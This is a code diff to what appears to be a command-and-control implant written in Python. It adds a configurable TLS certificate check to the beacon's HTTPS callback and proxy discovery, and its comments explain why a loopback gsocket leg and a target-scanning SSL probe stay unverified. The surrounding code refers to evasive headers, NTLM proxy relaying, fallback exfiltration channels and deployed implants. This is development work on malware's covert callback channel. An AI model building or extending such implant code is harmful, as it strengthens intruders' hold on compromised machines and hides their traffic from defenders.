@@ -2980,13 +2980,30 @@ class _HttpSession:
         # Without binding it the rung installed a route nothing could ever
         # select and said it had changed how the implant gets out.
         self.source_address = None
+        # Whether this session checks the certificate it is given. False
+        # is today's behaviour and the shipped default; `Beacon.verify_ssl`
+        # is what sets it, from `c2.fallback.https.verify_ssl`, which until
+        # now was assigned and read nowhere -- so the key in the file could
+        # not be turned on at all and the payload encryption was the only
+        # control left over the internet.
+        #
+        # An attribute rather than a constructor argument because this
+        # class has five call sites and `_bound_session` is the one owner
+        # of what a session carries; adding it there reaches all of them.
+        self.verify: bool = False
         self._cookie_jar = urllib.request.HTTPCookieProcessor()
 
     def _build_opener(self):
         handlers = [self._cookie_jar]
         ssl_ctx = ssl.create_default_context()
-        ssl_ctx.check_hostname = False
-        ssl_ctx.verify_mode = ssl.CERT_NONE
+        if not self.verify:
+            # Both halves, because either alone is a hole: CERT_REQUIRED
+            # with `check_hostname` off accepts a certificate that is valid
+            # for somebody else's name. `create_default_context` has both
+            # on, so verification needs no positive branch -- only this
+            # one, and it says what it gives up.
+            ssl_ctx.check_hostname = False
+            ssl_ctx.verify_mode = ssl.CERT_NONE
         keylog = os.environ.get("SSLKEYLOGFILE")
         if keylog and hasattr(ssl_ctx, "keylog_filename"):
             ssl_ctx.keylog_filename = keylog
@@ -3559,9 +3576,14 @@ class _NtlmProxyRelay:
 class ProxyDiscovery:
     """Discovers HTTP/HTTPS proxies from environment, system settings, PAC/WPAD, and px."""
 
-    def __init__(self):
+    def __init__(self, verify: bool = False):
         self._discovered: list[dict] = []
         self._active_proxy: Optional[dict] = None
+        # `select_working` makes a real HTTPS request to the operator's own
+        # callback URL, before any beacon traffic, so it is the second half
+        # of the same switch. Default False, which is what it has always
+        # done.
+        self.verify = verify
 
     def discover_all(self) -> list[dict]:
         self._discovered = []
@@ -3600,8 +3622,9 @@ class ProxyDiscovery:
                     "http": proxy["url"], "https": proxy["url"],
                 })
                 ssl_ctx = ssl.create_default_context()
-                ssl_ctx.check_hostname = False
-                ssl_ctx.verify_mode = ssl.CERT_NONE
+                if not self.verify:
+                    ssl_ctx.check_hostname = False
+                    ssl_ctx.verify_mode = ssl.CERT_NONE
                 opener = urllib.request.build_opener(
                     proxy_handler,
                     urllib.request.HTTPSHandler(context=ssl_ctx),
@@ -6421,7 +6444,13 @@ class Beacon:
 
         self.https_enabled = https_cfg.get("enabled", False)
         self.callback_url = https_cfg.get("callback_url", "")
-        self.verify_ssl = https_cfg.get("verify_ssl", False)
+        # `is True`, not truthiness: `bool("false")` is True, and this
+        # setting is the difference between a verified channel and one that
+        # only says it is. The gsocket block refuses a quoted boolean by
+        # name for the same reason; here an unreadable value falls back to
+        # the shipped default rather than stopping an implant that is
+        # already deployed.
+        self.verify_ssl = https_cfg.get("verify_ssl", False) is True
 
         self.dns_enabled = dns_cfg.get("enabled", False)
         self.dns_domain = dns_cfg.get("domain", "")
@@ -6529,7 +6558,7 @@ class Beacon:
         self.proxy_url = proxy_cfg.get("url", "")
         self._proxy_ntlm_cfg = proxy_cfg.get("ntlm", {})
 
-        self._proxy = ProxyDiscovery()
+        self._proxy = ProxyDiscovery(verify=self.verify_ssl)
         self._proxy_session: Optional[_HttpSession] = None
         self._ntlm_relay: Optional[_NtlmProxyRelay] = None
 
@@ -7102,6 +7131,14 @@ class Beacon:
             # radio lease may drop at any moment buys nothing.
             session = _HttpSession()
             session.trust_env = False
+            # `verify` is left off here whatever `c2.fallback.https.verify_ssl`
+            # says, and that is the one deliberate exception. The peer is
+            # `127.0.0.1` on this host, reached through the gsocket leg's
+            # own child: no certificate names a loopback forward, so
+            # verification could only refuse the leg that exists for the
+            # network where every other one failed. The GSRN section of
+            # docs/LISTENERS.md states the same thing about that block's
+            # `https` scheme.
         hdrs = self._post_headers() if endpoint == "result" else self._evasive_headers()
         try:
             resp = session.post(
@@ -10757,6 +10794,7 @@ class Beacon:
         `_way_out_bind`.
         """
         session = _HttpSession()
+        session.verify = self.verify_ssl
         if self._way_out_source:
             session.source_address = (self._way_out_source, 0)
         return session
@@ -12190,6 +12228,11 @@ class Beacon:
     def _probe_ssl(ip: str, port: int, timeout: float = 2.0) -> str:
         try:
             ctx = ssl.create_default_context()
+            # Unverified on purpose, and not covered by
+            # `c2.fallback.https.verify_ssl`: this exists to *report* a
+            # target's certificate -- issuer, subject, expiry,
+            # fingerprint -- and a scan that verified would refuse exactly
+            # the self-signed and expired hosts it is run to find.
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
             with socket.create_connection((ip, port), timeout=timeout) as sock:
